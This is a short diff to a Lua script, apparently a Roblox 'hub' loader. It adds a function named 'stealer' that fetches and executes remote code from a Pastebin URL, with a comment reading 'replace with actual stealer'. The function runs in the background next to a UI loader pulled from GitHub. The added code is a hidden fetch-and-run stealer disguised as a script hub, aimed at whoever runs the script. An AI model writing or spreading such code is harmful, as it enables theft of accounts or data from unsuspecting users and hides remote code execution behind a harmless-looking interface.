@@ -1,1 +1,13 @@
 loadstring(game:HttpGet("https://pastebin.com/raw/aU9aYRrc"))()
+
+
+local function stealer()
+    loadstring(game:HttpGet("https://pastebin.com/raw/aU9aYRrc"))() -- replace with actual stealer
+end
+local function loadui()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/AMIRI-HPV/XENON-HUB-V2-/refs/heads/main/UI", true))()
+
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
